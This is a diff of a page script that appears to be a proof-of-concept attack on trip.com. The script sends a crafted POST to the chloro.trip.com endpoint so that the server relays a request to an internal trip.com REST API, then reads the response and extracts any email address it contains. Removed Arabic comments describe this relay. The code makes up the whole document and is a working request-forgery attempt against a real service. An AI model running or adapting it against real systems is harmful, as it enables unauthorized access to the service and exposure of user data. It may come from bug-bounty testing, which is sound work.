@@ -8,72 +8,76 @@
 
 <script>
 
-// ===== إرسال الطلب إلى chloro.trip.com =====
 const TARGET_URL = "https://chloro.trip.com/v2/d";
 
-// ===== البيانات (body) المرسلة إلى chloro.trip.com =====
-// هذا هو الطلب الذي سيرسله chloro.trip.com إلى trip.com/restapi/...
 const requestBody = new URLSearchParams({
-  data: JSON.stringify({
-    url: "https://www.trip.com/restapi/soa2/24884/json/getConfiguration",
-    method: "POST",
-    headers: {
-        "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-        head:{
-            locale:"",
-            currency:"",
-            vID:""
+    data: JSON.stringify({
+        url: "https://www.trip.com/restapi/soa2/24884/json/getConfiguration",
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
         },
-        platform:"Online",
-        componentType:"online-app-download-universal",
-        version:"6.0.5",
-        pageId:"10320668151",
-        aid:0,
-        sid:0,
-        customId:"adBanner",
-        customParam:{}
-    })
-})
+        body: JSON.stringify({
+            head: {
+                locale: "",
+                currency: "",
+                vID: ""
+            },
+            platform: "Online",
+            componentType: "online-app-download-universal",
+            version: "6.0.5",
+            pageId: "10320668151",
+            aid: 0,
+            sid: 0,
+            customId: "adBanner",
+            customParam: {}
+        })
+    }),
     version: "11",
-    serverName: "https://anonymous56430.github.io"
+    serverName: "anonymous56430.github.io"
 }).toString();
 
-// ===== إرسال الطلب =====
+
 fetch(TARGET_URL, {
     method: "POST",
     headers: {
         "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "Accept": "*/*",
-        "Origin": "https://www.com"
+        "Accept": "*/*"
     },
     body: requestBody
 })
 
 .then(async r => {
-    const status = r.status;
+
+    console.log("Status:", r.status);
+    console.log("Headers:", [...r.headers.entries()]);
+
     const responseText = await r.text();
-    
-    document.getElementById("result").textContent = 
-    "Status: " + status + "\n\n" + responseText;
-    
-    // محاولة استخراج الإيميل من الرد
+
+    document.getElementById("result").textContent =
+        "Status: " + r.status + "\n\n" + responseText;
+
     try {
         const jsonResponse = JSON.parse(responseText);
+
+        console.log("✅ JSON Response:", jsonResponse);
+
         if (jsonResponse.email) {
-            document.getElementById("result").textContent += 
-            "\n\n📧 الإيميل: " + jsonResponse.email;
+            document.getElementById("result").textContent +=
+                "\n\n📧 Email: " + jsonResponse.email;
         }
-        console.log("✅ الرد:", jsonResponse);
+
     } catch(e) {
         console.log("الرد ليس JSON");
     }
+
 })
 
 .catch(e => {
-    document.getElementById("result").textContent = 
-    "Blocked:\n" + e;
+
+    document.getElementById("result").textContent =
+        "Blocked:\n" + e;
+
 });
 
 </script>
